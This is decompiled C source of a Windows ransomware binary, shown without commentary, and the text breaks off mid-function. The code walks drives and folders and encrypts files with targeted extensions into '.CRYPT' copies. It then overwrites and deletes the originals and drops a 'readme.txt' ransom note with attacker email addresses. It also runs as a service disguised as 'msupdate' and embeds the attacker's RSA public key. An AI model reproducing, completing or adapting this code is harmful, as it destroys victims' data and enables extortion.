int (__cdecl *off_531288)(void *Block, size_t Size, int, int) = &sub_413500; // weak
int (__cdecl *off_53128C)(void *Block) = &sub_413490; // weak
char *off_53129C = "OpenSSL PKCS#1 RSA (from Eric Young)"; // weak
void *off_5312E4 = &loc_419FE0; // weak
void *off_531310 = &unk_5312FC; // weak
int dword_531314 = 1061; // weak
int dword_531318 = 1; // weak
void *off_53131C = &unk_50D570; // weak
char *off_5313C4 = "OpenSSL DSA method"; // weak
char *off_5313F4[2] = { &off_506A24, "B-163" }; // weak
char *off_5313F8 = "B-163"; // weak
int dword_5313FC[] = { 723 }; // weak
char *off_531470[2] = { "openssl", "Software engine support" }; // weak
char *off_531474 = "Software engine support"; // weak
_UNKNOWN unk_531478; // weak
char *off_531490[4] = { "rdrand", "Intel RDRAND engine", "dynamic", "Dynamic engine loading support" }; // weak
char *off_531494[3] = { "Intel RDRAND engine", "dynamic", "Dynamic engine loading support" }; // weak
char *off_531498[2] = { "dynamic", "Dynamic engine loading support" }; // weak
char *off_53149C = "Dynamic engine loading support"; // weak
int dword_5314A0 = -1; // weak
char *off_5314A4 = "padlock"; // weak
int dword_5314A8 = 15; // weak
_UNKNOWN unk_5314AC; // weak
_DWORD dword_5314C8 = 405504; // weak
_DWORD dword_531570 = 99; // weak
int dword_531668 = 1; // weak
char *off_53166C[2] = { "capi", "CryptoAPI ENGINE" }; // weak
char *off_531670 = "CryptoAPI ENGINE"; // weak
int dword_531674 = -1; // weak
int dword_531678 = -1; // weak
int dword_53167C = -1; // weak
int dword_531680 = -1; // weak
char (*off_53169C)[3] = &byte_4F1291; // weak
void *off_5316A0 = &unk_519CD0; // weak
int dword_5316C8[] = { 5 }; // weak
char *off_531700[2] = { "G", "H" }; // weak
_UNKNOWN unk_5317D8; // weak
char *off_5318D4 = "OpenSSL DH Method"; // weak
int dword_5318F8 = 872824832; // weak
_DWORD dword_531910 = 872415332; // weak
int dword_531930 = 856047616; // weak
_DWORD dword_531968 = 855638117; // weak
int dword_531990 = 839340032; // weak
_DWORD dword_531A70 = 838860908; // weak
int dword_531AF8 = 772157440; // weak
_DWORD dword_531D80 = 771752035; // weak
int dword_532018 = 671531008; // weak
_DWORD dword_532080 = 671088744; // weak
int dword_5320C0 = 654729216; // weak
_DWORD dword_532140 = 654311525; // weak
int dword_532218 = 638271488; // weak
_DWORD dword_532348 = 637534308; // weak
int dword_532468 = 788979712; // weak
_DWORD dword_532620 = 788529284; // weak
int dword_532758 = 621166592; // weak
_DWORD dword_532868 = 620757092; // weak
int dword_5328F0 = 604389376; // weak
_DWORD dword_532900 = 603979876; // weak
int dword_532910 = 587632640; // weak
_DWORD dword_5329E0 = 587202660; // weak
int dword_532A90 = 571097088; // weak
_DWORD dword_532C78 = 570425462; // weak
int dword_532E88 = 554205184; // weak
_DWORD dword_532FA0 = 553648245; // weak
int dword_5330D8 = 537280512; // weak
_DWORD dword_533220 = 536871012; // weak
int dword_533348 = 269352960; // weak
_DWORD dword_5337D8 = 268435571; // weak
int dword_5339B8 = 688271360; // weak
_DWORD dword_5339E0 = 687865955; // weak
int dword_533A00 = 252108800; // weak
_DWORD dword_533A60 = 251658341; // weak
int dword_533A80 = 235307008; // weak
_DWORD dword_533B20 = 234881134; // weak
int dword_533BA0 = 218513408; // weak
_DWORD dword_533EA8 = 218103979; // weak
int dword_534220 = 184958976; // weak
_DWORD dword_5343C0 = 184549486; // weak
int dword_5344D8 = 168181760; // weak
_DWORD dword_534590 = 167772262; // weak
int dword_5345F0 = 151515136; // weak
_DWORD dword_534728 = 150995044; // weak
int dword_534820 = 134647808; // weak
_DWORD dword_534860 = 134217830; // weak
int dword_534878 = 117850112; // weak
int dword_534898 = 101339136; // weak
_DWORD dword_534AA8 = 100663439; // weak
int dword_534C88 = 84303872; // weak
_DWORD dword_534D28 = 83886181; // weak
int dword_534D98 = 67682304; // weak
_DWORD dword_534F50 = 67108964; // weak
int dword_535150 = 50851840; // weak
_DWORD dword_5352B8 = 50331748; // weak
_UNKNOWN unk_535360; // weak
_UNKNOWN unk_535394; // weak
_DWORD dword_5353C8 = 0; // weak
char *off_5353CC = "OpenSSL default user interface"; // weak
char *off_5353E8[4] =
{
  "Generator (compressed):",
  "Generator (uncompressed):",
  "Generator (hybrid):",
  "0123456789ABCDEF"
}; // weak
char *off_5353EC[3] = { "Generator (uncompressed):", "Generator (hybrid):", "0123456789ABCDEF" }; // weak
int off_5353F0 = 5379976; // idb
char *off_5353F4 = "0123456789ABCDEF"; // weak
int dword_5353F8[] = { 5 }; // weak
char *off_5353FC = "status_request"; // idb
int dword_535588 = 8192; // weak
char *off_53565C = "OpenSSL 'win32' shared library method"; // weak
char *off_535684 = "OpenSSL default"; // weak
char *off_5356AC = "WIN32"; // weak
_BYTE byte_5356D4[4] = { -13, 23, 34, 83 }; // weak
char *off_5356DC = "0123456789ABCDEF"; // weak
void *off_5356E0 = &unk_73C840; // weak
uintptr_t __security_cookie = 3141592654u;
char *off_536488[44] =
{
  "No error",
  "Operation not permitted",
  "No such file or directory",
  "No such process",
  "Interrupted function call",
  "Input/output error",
  "No such device or address",
  "Arg list too long",
  "Exec format error",
  "Bad file descriptor",
  "No child processes",
  "Resource temporarily unavailable",
  "Not enough space",
  "Permission denied",
  "Bad address",
  "Unknown error",
  "Resource device",
  "File exists",
  "Improper link",
  "No such device",
  "Not a directory",
  "Is a directory",
  "Invalid argument",
  "Too many open files in system",
  "Too many open files",
  "Inappropriate I/O control operation",
  "Unknown error",
  "File too large",
  "No space left on device",
  "Invalid seek",
  "Read-only file system",
  "Too many links",
  "Broken pipe",
  "Domain error",
  "Result too large",
  "Unknown error",
  "Resource deadlock avoided",
  "Unknown error",
  "Filename too long",
  "No locks available",
  "Function not implemented",
  "Directory not empty",
  "Illegal byte sequence",
  "Unknown error"
}; // weak
_UNKNOWN unk_536538; // weak
int dword_5365C8 = 28800; // weak
int dword_5365CC = 1; // weak
int dword_5365D0 = -3600; // weak
void **off_536658[2] = { &off_5365D8, &off_536618 }; // weak
int dword_536798 = 1024; // weak
int dword_53679C = -1023; // weak
int dword_5367A0 = 53; // weak
int dword_5367A4 = 11; // weak
int dword_5367A8 = 64; // weak
int dword_5367AC = 1023; // weak
int dword_5367B0 = 128; // weak
int dword_5367B4 = -127; // weak
int dword_5367B8 = 24; // weak
int dword_5367BC = 8; // weak
int dword_5367C0 = 32; // weak
int dword_5367C4 = 127; // weak
char aBeginRsaPublic[427] = "-----BEGIN RSA PUBLIC KEY-----\nMIIBCAKCAQEAyLBClz9hsFGRf9fk3z0zmY2rz2J1qqGfV48DSjPV4lcwnhCi4/5+\nC6UsAhk/dI4/5HwbfZBAiMySXNB3DxVB2hOrjDjIeVAkFjQgZ19B+KQFWkSo1ube\nVdHjwdv74evE/ur9Lv9HM+89iZdzEpVPO+AjOTtsQgFNtmVecC2vmw9m60dgyR/1\nCJQSg6Moblo2NVF50AK3cIG2/lVh82ebgedXsbVJpjVMc03aTPWV4sNWjTO3o+aX\n6Z+VGVLjuvcpfLDZb3tYppkqZzAHfrCt7lV0qO47FV8sFCltuoNiNGKiP084KI7b\n3XEJepbSJB3UW4o4C4zHFrqmdyOoUlnqcQIBAw==\n-----END RSA PUBLIC KEY-----\n"; // weak
char Str[] = ".TIF .TIFF .PDF .XLS .XLSX .XLTM .PS .PPS .PPT .PPTX .DOC .DOCX .LOG .MSG .RTF .TEX .TXT .CAD .WPS .EML .INI .CSS .HTM .HTML  .XHTML .JS .JSP .PHP .KEYCHAIN .PEM .SQL .APK .APP .BAT .CGI .ASPX .CER .CFM .C .CPP .GO .CONFIG .PL .PY .DWG .XML .JPG .BMP .PNG .EXE .DLL .CAD .AVI .H.CSV .DAT .ISO .PST .PGD  .7Z .RAR .ZIP .ZIPX .TAR .PDB .BIN .DB .MDB .MDF .BAK .LOG .EDB .STM .DBF .ORA .GPG .EDB .MFS"; // idb
char VarName[] = "WINDIR"; // idb
char aKonedieypAirma[45] = "konedieyp@airmail.cc or uenwonken@memail.com"; // weak
int dword_5373A8 = 1; // weak
int dword_5373C0 = 0; // weak
int dword_5373C4 = 0; // weak
int dword_5373C8 = 0; // weak
_UNKNOWN unk_5373CC; // weak
char byte_5373E0[4064] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  
}; // idb
_DWORD dword_5383C0; // weak
_UNKNOWN unk_5383C4; // weak
_UNKNOWN unk_5387B4; // weak
LPCRITICAL_SECTION dword_5388C0; // idb
DWORD dword_5388C4; // weak
LONG dword_5388C8; // idb
LONG dword_5388CC; // idb
void *dword_5388D0; // idb
int dword_5388D4; // weak
int dword_5388D8; // weak
_BYTE byte_5388E0[8]; // weak
_UNKNOWN unk_5388E8; // weak
LPCRITICAL_SECTION dword_538920; // idb
LONG dword_538924; // idb
int dword_538928; // weak
LPCRITICAL_SECTION dword_53892C; // idb
int dword_538AD8; // weak
int dword_538ADC; // weak
int dword_538AE0; // weak
int dword_538AE4; // weak
int dword_538AE8; // weak
int dword_538AEC; // weak
struct _RTL_CRITICAL_SECTION CriticalSection; // idb
int dword_538B18; // weak
int dword_538B1C; // weak
int dword_538B20; // weak
int dword_538B24; // weak
int dword_538B28; // weak
int dword_538B2C; // weak
char byte_538B30[1044]; // weak
int dword_538F44; // weak
int dword_538F48; // weak
int dword_538F4C; // weak
int dword_538F50; // weak
int dword_538F54; // weak
double dbl_538F58; // weak
LPCRITICAL_SECTION dword_538F60; // idb
LPCRITICAL_SECTION dword_538F64; // idb
LONG dword_538F68; // idb
int dword_538F6C; // weak
int dword_538F70; // weak
int dword_538F74; // weak
struct _RTL_CRITICAL_SECTION stru_538F78; // idb
void *dword_538F90; // idb
LPCRITICAL_SECTION dword_538F94; // idb
LONG dword_538F98; // idb
int dword_538F9C; // weak
int dword_538FA0; // weak
LONG dword_538FA4; // idb
int dword_538FA8; // weak
int dword_538FAC; // weak
int dword_538FB0; // weak
LONG dword_538FB4; // idb
int dword_538FB8; // weak
LONG dword_538FBC; // idb
int dword_538FC0; // weak
int dword_538FC4; // weak
LONG dword_538FC8; // idb
int dword_538FCC; // weak
int dword_538FD0; // weak
int dword_538FD4; // weak
LONG dword_538FD8; // idb
int dword_538FDC; // weak
int dword_538FE0; // weak
LONG dword_538FE4; // idb
int dword_538FE8; // weak
LONG dword_538FEC; // idb
int dword_538FF0; // weak
LONG dword_538FF4; // idb
int dword_538FF8; // weak
LONG dword_538FFC; // idb
int dword_539000; // weak
LONG dword_539004; // idb
int dword_539008; // weak
LONG dword_53900C; // idb
int dword_539010; // weak
int dword_539014; // weak
int dword_539018; // weak
LONG dword_53901C; // idb
int dword_539020; // weak
void *dword_539024; // idb
_UNKNOWN unk_539028; // weak
char byte_53902C; // weak
void *dword_539030; // idb
int dword_539034; // weak
DWORD dword_539038; // weak
DWORD dword_53903C; // weak
char byte_539040; // weak
int dword_539090; // weak
int dword_539094; // weak
struct _RTL_CRITICAL_SECTION stru_539098; // idb
int dword_5390B0; // weak
int dword_5390B4; // weak
int dword_5390B8; // weak
int dword_5390BC[4]; // weak
int dword_5390CC; // weak
int dword_5390D0; // weak
int dword_5390D4; // weak
int dword_5390D8[]; // weak
int dword_5390E0; // weak
int dword_5390E4; // weak
_UNKNOWN unk_5390E8; // weak
int dword_53914C; // weak
int dword_539150; // weak
int dword_539154; // weak
int dword_539158; // weak
int dword_53915C; // weak
int dword_539160; // weak
int dword_539164; // weak
int dword_539168; // weak
int dword_53916C; // weak
int dword_539170; // weak
int dword_539174; // weak
int dword_539178; // weak
int dword_53917C; // weak
int dword_539180; // weak
int dword_539184; // weak
int dword_539188; // weak
int dword_53918C; // weak
int dword_539190; // weak
void *dword_539194; // idb
void *dword_539198; // idb
int dword_53919C; // weak
void *dword_5391A0; // idb
void *dword_5391A4; // idb
struct _RTL_CRITICAL_SECTION stru_5391A8; // idb
int dword_539220; // weak
struct _RTL_CRITICAL_SECTION stru_539224; // idb
int dword_539264; // weak
void *dword_539268; // idb
int dword_53926C; // weak
void *dword_539270; // idb
void *dword_539274; // idb
void *dword_539278; // idb
void *dword_53927C; // idb
int dword_539280; // weak
int dword_539284; // weak
struct _RTL_CRITICAL_SECTION stru_539288; // idb
int dword_5392A0; // weak
int dword_5392A4; // weak
int dword_5392A8; // weak
FILE *dword_5392AC; // idb
FILE *Stream; // idb
int dword_5392B4; // weak
_crt_signal_t dword_5392C0; // idb
_crt_signal_t dword_5392C8; // idb
_crt_signal_t dword_5392D8; // idb
_crt_signal_t dword_5392E4; // idb
_crt_signal_t dword_5392F4; // idb
_crt_signal_t Function; // idb
DWORD dword_539338; // idb
int dword_53933C; // weak
void *dword_539340; // idb
_UNKNOWN unk_539350; // weak
int dword_5393C8; // weak
_UNKNOWN unk_5393D0; // weak
int dword_539468; // weak
int dword_53979C; // weak
int dword_539C14; // weak
int dword_539C80; // weak
int dword_539C8C; // weak
int dword_539C90; // weak
int dword_539DA4; // weak
int dword_539E60; // weak
int dword_539E64; // weak
int dword_539E68; // weak
int dword_539E6C; // weak
int dword_539E70; // weak
struct _SERVICE_STATUS ServiceStatus; // idb
SERVICE_STATUS_HANDLE hServiceStatus; // idb
_UNKNOWN unk_539EF0; // weak
_UNKNOWN unk_600000; // weak
char Buffer[1048576]; // idb
char SubStr[2552]; // weak
void *Block; // idb
char byte_73A8F0[7632]; // idb
LPCRITICAL_SECTION dword_73C6C0; // idb
LPCRITICAL_SECTION dword_73C6C4; // idb
int dword_73C6D0; // weak
int dword_73C6D4; // weak
int dword_73C6D8; // weak
int dword_73C6E0; // weak
int dword_73C6E4; // weak


//----- (00401000) --------------------------------------------------------
unsigned int sub_401000()
{
  unsigned __int8 *v0; // esi
  const char *v1; // ebx
  int v2; // ebp
  unsigned int result; // eax
  char Buffer; // [esp+10h] [ebp-8h] BYREF
  __int16 v5; // [esp+11h] [ebp-7h]
  unsigned __int8 *v6; // [esp+14h] [ebp-4h]

  v0 = (unsigned __int8 *)calloc(0x21u, 1u);
  v6 = v0;
  sub_4079C0(aBeginRsaPublic, strlen(aBeginRsaPublic), v0);
  v1 = (const char *)calloc(0x41u, 1u);
  Buffer = 0;
  v5 = 0;
  v2 = 0;
  while ( 1 )
  {
    sprintf(&Buffer, "%02x", v0[v2]);
    result = strlen(&Buffer) + 1;
    qmemcpy((void *)&v1[strlen(v1)], &Buffer, result);
    if ( ++v2 >= 32 )
      break;
    v0 = v6;
  }
  *((_BYTE *)v1 + 32) = 0;
  Block = (void *)v1;
  return result;
}

//----- (004010C0) --------------------------------------------------------
BOOL __usercall sub_4010C0@<eax>(FILE *a1@<esi>)
{
  BOOL v1; // edi
  size_t v2; // eax
  int v3; // ecx
  size_t v4; // eax
  FILE *v6; // [esp+0h] [ebp-21Ch]
  int v7; // [esp+8h] [ebp-214h] BYREF
  int v8; // [esp+Ch] [ebp-210h] BYREF
  char v9[8]; // [esp+10h] [ebp-20Ch] BYREF
  int Buffer[64]; // [esp+18h] [ebp-204h] BYREF
  char v11[256]; // [esp+118h] [ebp-104h] BYREF

  v1 = 0;
  v2 = fread(Buffer, 1u, 8u, v6);
  if ( v2 == 8 )
  {
    v3 = 0;
    while ( Buffer[v3] == dword_52F77C[v3] )
    {
      v2 -= 4;
      ++v3;
      if ( v2 < 4 )
      {
        if ( fread(&v7, 1u, 4u, a1) == 4 && v7 == 256 )
        {
          v4 = fread(v11, 1u, 0x100u, a1);
          if ( v4 == v7 && fread(&v8, 1u, 4u, a1) == 4 && (v8 == 3 || v8 == 4) )
            v1 = fread(v9, 1u, 8u, a1) == 8;
        }
        break;
      }
    }
  }
  fclose(a1);
  return v1;
}
// 4010E1: variable 'v6' is possibly undefined
// 52F77C: using guessed type int dword_52F77C[];
// 4010C0: using guessed type char var_104[256];
// 4010C0: using guessed type char var_20C[8];

//----- (004011C0) --------------------------------------------------------
int __fastcall sub_4011C0(void *a1, char *a2, int a3, void *a4)
{
  int v5; // eax
  FILE *v6; // esi
  size_t v7; // ebx
  void *v8; // edi
  void **v9; // eax
  unsigned int v10; // ebx
  size_t v11; // ebp
  unsigned int v12; // ebx
  unsigned int v13; // ebp
  unsigned __int64 v14; // kr10_8
  void *v15; // edi
  int *v16; // eax
  signed int v17; // edi
  void *v18; // edi
  __int64 v19; // kr18_8
  void *v20; // ebx
  void *v21; // edi
  FILE *v22; // ebp
  unsigned int v23; // ebx
  int v24; // eax
  __int64 v25; // rdi
  __int64 v26; // rax
  unsigned int v27; // kr00_4
  __int64 v28; // rax
  int v30; // [esp-14h] [ebp-5E8h]
  size_t v31; // [esp+10h] [ebp-5C4h] BYREF
  FILE *Stream; // [esp+14h] [ebp-5C0h]
  __int64 v33; // [esp+18h] [ebp-5BCh]
  void *v34; // [esp+20h] [ebp-5B4h]
  size_t ElementCount; // [esp+24h] [ebp-5B0h] BYREF
  void *Block; // [esp+28h] [ebp-5ACh]
  char *FileName; // [esp+2Ch] [ebp-5A8h]
  void *Buffer; // [esp+30h] [ebp-5A4h]
  int v39; // [esp+34h] [ebp-5A0h]
  int v40; // [esp+3Ch] [ebp-598h] BYREF
  struct _stat64 Stat; // [esp+40h] [ebp-594h] BYREF
  int v42[13]; // [esp+7Ch] [ebp-558h] BYREF
  CHAR String1[1308]; // [esp+B0h] [ebp-524h] BYREF

  FileName = a2;
  Buffer = a4;
  v34 = a1;
  memset(String1, 0, 1300);
  v33 = 0i64;
  if ( strlen(a2) <= 0x50C )
    v5 = strlen(a2) + 1;
  else
    v5 = 1292;
  lstrcpynA(String1, a2, v5);
  lstrcatA(String1, ".CRYPT");
  Stream = fopen(a2, "rb+");
  if ( !Stream )
    return -1;
  v6 = fopen(String1, "wb");
  if ( !v6 )
    return -1;
  memset(v42, 0, 49);
  sub_406FF0();
  fwrite(dword_52F77C, 1u, 8u, v6);
  v7 = sub_4070E0(a3) + 1;
  v8 = malloc(v7);
  memset(v8, 0, v7);
  ElementCount = sub_407100(48, (int)v42, (int)v8, a3);
  if ( (ElementCount & 0x80000000) != 0 )
  {
    v9 = sub_4DA3E6();
    sub_4067B0((int)(v9 + 8));
    fclose(v6);
    fclose(Stream);
    return -1;
  }
  fwrite(&ElementCount, 1u, 4u, v6);
  fwrite(v8, 1u, ElementCount, v6);
  v10 = (unsigned __int64)((int)ElementCount + 12i64) >> 32;
  v11 = ElementCount + 12;
  free(v8);
  v40 = 4;
  fwrite(&v40, 1u, 4u, v6);
  _stat64(FileName, &Stat);
  fwrite(&Stat.st_size, 1u, 8u, v6);
  v14 = __PAIR64__(v10, v11) + 12;
  v12 = (__PAIR64__(v10, v11) + 12) >> 32;
  v13 = v14;
  v15 = sub_405990();
  Block = v15;
  v16 = (int *)sub_402F00();
  sub_406270((int **)v15, v16, 0, 0, 0, 1);
  sub_406270((int **)v15, 0, 0, (int)v42, &v42[8], 1);
  v17 = fread(Buffer, 1u, 0x100000u, Stream);
  if ( v17 > 0 )
  {
    while ( 1 )
    {
      v33 += v17;
      _fseeki64(Stream, v33, 0);
      v30 = v17;
      v18 = Buffer;
      if ( !sub_406560(Block, (char *)v34, (int *)&v31, (char *)Buffer, v30) )
        break;
      v19 = (int)fwrite(v34, 1u, v31, v6) + __PAIR64__(v12, v13);
      v12 = HIDWORD(v19);
      v13 = v19;
      _fseeki64(v6, v19, 0);
      v17 = fread(v18, 1u, 0x100000u, Stream);
      if ( v17 <= 0 )
        goto LABEL_11;
    }
    sub_4059B0(Block);
    fclose(v6);
    fclose(Stream);
    return -1;
  }
LABEL_11:
  v20 = v34;
  v21 = Block;
  sub_406580(Block, (int)v34, (int *)&v31);
  fwrite(v20, 1u, v31, v6);
  sub_405920(v21);
  free(v21);
  fclose(v6);
  v22 = Stream;
  _fseeki64(Stream, 0i64, 0);
  v23 = HIDWORD(v33);
  if ( v33 <= 0x100000 )
    v24 = v33;
  else
    v24 = 0x100000;
  v25 = 0i64;
  v31 = v24;
  if ( v33 > 0 )
  {
    while ( 1 )
    {
      if ( v24 < 0 )
      {
        v24 = 0x100000;
        v31 = 0x100000;
      }
      v26 = (int)fwrite(&unk_539EF0, 1u, v24, v22);
      v27 = v26;
      LODWORD(v26) = v33;
      v25 += __PAIR64__(HIDWORD(v26), v27);
      HIDWORD(v26) = v23;
      v28 = v26 - v25;
      v39 = HIDWORD(v28);
      if ( v28 < 0 || (__SPAIR64__(v23, v33) < v25 || HIDWORD(v28) == 0) && (unsigned int)v28 <= 0x100000 )
        v31 = v28;
      else
        v31 = 0x100000;
      _fseeki64(v22, v25, 0);
      if ( v25 >= __SPAIR64__(v23, v33) )
        break;
      v24 = v31;
    }
  }
  fclose(v22);
  remove(FileName);
  return 0;
}
// 52F77C: using guessed type int dword_52F77C[];

//----- (004015D0) --------------------------------------------------------
int __usercall sub_4015D0@<eax>(int a1@<ebx>, CHAR *a2@<edi>, int a3, void *a4, void *a5)
{
  int result; // eax
  FILE *v6; // eax

  result = GetFileAttributesA(a2);
  if ( result != -1 )
  {
    v6 = fopen(a2, "rb");
    if ( !v6 || (result = sub_4010C0(v6)) == 0 || a3 != 1 )
    {
      result = a3;
      if ( a3 == 1 )
        return sub_4011C0(a5, a2, a1, a4);
    }
  }
  return result;
}

//----- (00401640) --------------------------------------------------------
HANDLE __cdecl sub_401640(int a1, const char *a2, int a3, int a4, void *a5, void *a6)
{
  void *v6; // esp
  HANDLE result; // eax
  char *v8; // ebx
  size_t v9; // eax
  unsigned int j; // edi
  FILE *v11; // eax
  int v12; // eax
  char v13; // cl
  unsigned int i; // edi
  int v15; // edi
  char *v16; // eax
  char *v17; // edi
  char *v19; // eax
  FILE *v21; // edi
  HANDLE hFindFile; // [esp+4h] [ebp-1608h]
  char v23; // [esp+1Bh] [ebp-15F1h]
  struct _WIN32_FIND_DATAA FindFileData; // [esp+1Ch] [ebp-15F0h] BYREF
  CHAR FileName[1303]; // [esp+15Ch] [ebp-14B0h] BYREF
  char v26; // [esp+673h] [ebp-F99h] BYREF
  char v27[1304]; // [esp+674h] [ebp-F98h] BYREF
  char Buffer[1303]; // [esp+B8Ch] [ebp-A80h] BYREF
  char v29; // [esp+10A3h] [ebp-569h] BYREF
  char Str[1304]; // [esp+10A4h] [ebp-568h] BYREF
  char SubStr[52]; // [esp+15BCh] [ebp-50h] BYREF
  CPPEH_RECORD ms_exc; // [esp+15F4h] [ebp-18h]

  v6 = alloca(5624);
  ms_exc.registration.ScopeTable = (PSCOPETABLE_ENTRY)((int)ms_exc.registration.ScopeTable ^ __security_cookie);
  memset(&FindFileData, 0, sizeof(FindFileData));
  memset(FileName, 0, 1300);
  v23 = 1;
  if ( a2[strlen(a2) - 1] == 92 || a2[strlen(a2) - 1] == 47 )
    sprintf(FileName, "%s%s", a2, "*.*");
  else
    sprintf(FileName, "%s\\%s", a2, "*.*");
  result = FindFirstFileA(FileName, &FindFileData);
  hFindFile = result;
  if ( result != (HANDLE)-1 )
  {
    do
    {
      if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
      {
        if ( FindFileData.cFileName[0] != 46 && strlen(a2) + strlen(FindFileData.cFileName) < 0x514 )
        {
          memset(v27, 0, 0x514u);
          memset(Str, 0, 0x514u);
          sprintf(v27, "%s%s", a2, FindFileData.cFileName);
          v12 = 0;
          do
          {
            v13 = v27[v12];
            Str[v12++] = v13;
          }
          while ( v13 );
          for ( i = 0; i < strlen(Str); ++i )
            Str[i] = toupper(Str[i]);
          v15 = 0;
          if ( ::SubStr[0] )
          {
            v16 = ::SubStr;
            while ( !strstr(Str, v16) )
            {
              ++v15;
              v16 = &::SubStr[255 * v15];
              if ( !*v16 )
                goto LABEL_35;
            }
            v23 = 0;
          }
LABEL_35:
          v17 = &v26;
          while ( *++v17 )
            ;
          *(_WORD *)v17 = 92;
          if ( v23 )
          {
            if ( strstr(Str, "DESKTOP") )
            {
              v19 = &v29;
              while ( *++v19 )
                ;
              strcpy(v19, "/readme.txt");
              v21 = fopen(Str, "w+");
              if ( v21 )
              {
                fwrite(::Buffer, 1u, strlen(::Buffer), v21);
                fclose(v21);
              }
            }
            sub_401640(a1, v27, a3, a4, a5, a6);
          }
          v23 = 1;
        }
      }
      else
      {
        v8 = strrchr(FindFileData.cFileName, 46);
        if ( v8 && strlen(a2) + strlen(FindFileData.cFileName) < 0x514 )
        {
          memset(SubStr, 0, 0x32u);
          if ( strlen(v8) <= 0x32 )
            v9 = strlen(v8);
          else
            v9 = 50;
          strncpy(SubStr, v8, v9);
          for ( j = 0; j < strlen(SubStr); ++j )
            SubStr[j] = toupper(SubStr[j]);
          if ( strstr(::Str, SubStr) && strcmp(FindFileData.cFileName, "readme.txt") )
          {
            memset(Buffer, 0, 0x514u);
            if ( a2[strlen(a2) - 1] == 92 || a2[strlen(a2) - 1] == 47 )
              sprintf(Buffer, "%s%s", a2, FindFileData.cFileName);
            else
              sprintf(Buffer, "%s\\%s", a2, FindFileData.cFileName);
            ms_exc.registration.TryLevel = 0;
            v11 = fopen(Buffer, "rb+");
            if ( v11 )
            {
              fclose(v11);
              memset(a5, 0, 0x100000u);
              memset(a6, 0, 0x100000u);
              sub_4015D0(a1, Buffer, a3, a5, a6);
            }
            ms_exc.registration.TryLevel = -2;
          }
        }
      }
      result = (HANDLE)FindNextFileA(hFindFile, &FindFileData);
    }
    while ( result );
    if ( hFindFile != (HANDLE)-1 )
      return (HANDLE)FindClose(hFindFile);
  }
  return result;
}
// 401640: using guessed type char SubStr[52];
// 401640: using guessed type char var_F98[1304];
// 401640: using guessed type char Str[1304];

//----- (00401C10) --------------------------------------------------------
BOOL __usercall sub_401C10@<eax>(DWORD a1@<eax>, DWORD a2@<edx>)
{
  ServiceStatus.dwCurrentState = a1;
  ServiceStatus.dwWin32ExitCode = 0;
  ServiceStatus.dwWaitHint = a2;
  if ( a1 == 2 )
  {
    ServiceStatus.dwControlsAccepted = 0;
LABEL_5:
    ServiceStatus.dwCheckPoint = dword_5373A8++;
    return SetServiceStatus(hServiceStatus, &ServiceStatus);
  }
  ServiceStatus.dwControlsAccepted = 1;
  if ( a1 != 4 && a1 != 1 )
    goto LABEL_5;
  ServiceStatus.dwCheckPoint = 0;
  return SetServiceStatus(hServiceStatus, &ServiceStatus);
}
// 5373A8: using guessed type int dword_5373A8;

//----- (00401C80) --------------------------------------------------------
SC_HANDLE sub_401C80()
{
  SC_HANDLE result; // eax
  SC_HANDLE v1; // edi
  SC_HANDLE v2; // eax
  SC_HANDLE v3; // esi

  result = OpenSCManagerA(0, 0, 0xF003Fu);
  v1 = result;
  if ( result )
  {
    v2 = OpenServiceA(result, "msupdate", 0xF01FFu);
    v3 = v2;
    if ( v2 )
    {
      DeleteService(v2);
      ServiceStatus.dwCurrentState = 1;
      ServiceStatus.dwControlsAccepted = 1;
      ServiceStatus.dwWin32ExitCode = 0;
      ServiceStatus.dwWaitHint = 0;
      ServiceStatus.dwCheckPoint = 0;
      SetServiceStatus(hServiceStatus, &ServiceStatus);
      CloseServiceHandle(v3);
    }
    return (SC_HANDLE)CloseServiceHandle(v1);
  }
  return result;
}

//----- (00401D10) --------------------------------------------------------
SC_HANDLE sub_401D10()
{
  int v0; // ebx
  void *v1; // eax
  void *v2; // edi
  char *v3; // eax
  int v4; // esi
  char *v5; // eax
  const char *v6; // edi
  char *v7; // edx
  char v8; // cl
  const char *v9; // eax
  unsigned int v10; // esi
  volatile LONG *v11; // esi
  volatile LONG *v12; // edi
  char v13; // al
  FILE *v14; // esi
  void *v16; // [esp+Ch] [ebp-11Ch] BYREF
  void *v17; // [esp+10h] [ebp-118h]
  void *Block; // [esp+14h] [ebp-114h]
  int v19; // [esp+18h] [ebp-110h]
  CHAR Buffer[260]; // [esp+20h] [ebp-108h] BYREF

  v0 = 0;
  ServiceStatus.dwCurrentState = 4;
  ServiceStatus.dwWin32ExitCode = 0;
  ServiceStatus.dwWaitHint = 0;
  ServiceStatus.dwControlsAccepted = 1;
  ServiceStatus.dwCheckPoint = 0;
  SetServiceStatus(hServiceStatus, &ServiceStatus);
  v1 = sub_402F00();
  v19 = sub_422350((int)v1);
  v17 = calloc(0x100011u, 1u);
  v2 = calloc(0x100011u, 1u);
  Block = v2;
  sub_401000();
  sprintf(
    ::Buffer,
    "Your file has been encrypted!\n"
    "\t\t\t\t\t\t If you want to decrypt, please contact us.\n"
    "\t\t\t\t\t\t %s\n"
    "\t\t\t\t\t\t And please send me the following hash!\n"
    "\t\t\t\t\t\t %s\n",
    aKonedieypAirma,
    (const char *)::Block);
  if ( v17 && v2 )
  {
    memset(&unk_539EF0, 65, 0x100000u);
    v16 = 0;
    v3 = VarName;
    v4 = 0;
    do
    {
      if ( !*v3 )
        break;
      v5 = getenv(v3);
      v6 = &SubStr[v4];
      v7 = &SubStr[v4];
      do
      {
        v8 = *v5;
        *v7++ = *v5++;
      }
      while ( v8 );
      v9 = &SubStr[v4];
      v10 = 0;
      if ( &v9[strlen(v9)] != v6 )
      {
        do
        {
          v6[v10] = toupper(v6[v10]);
          ++v10;
        }
        while ( v10 < strlen(v6) );
      }
      v16 = (char *)v16 + 1;
      v4 = 255 * (_DWORD)v16;
      v3 = &VarName[255 * (_DWORD)v16];
    }
    while ( v3 );
    v16 = 0;
    v11 = sub_4067F0(aBeginRsaPublic, -1);
    v16 = (void *)sub_4070B0(v11, (int)&v16, 0, 0);
    sub_404F50(v11);
    v12 = (volatile LONG *)v16;
    if ( v16 )
    {
      if ( GetLogicalDrives() )
      {
        memset(Buffer, 0, 255);
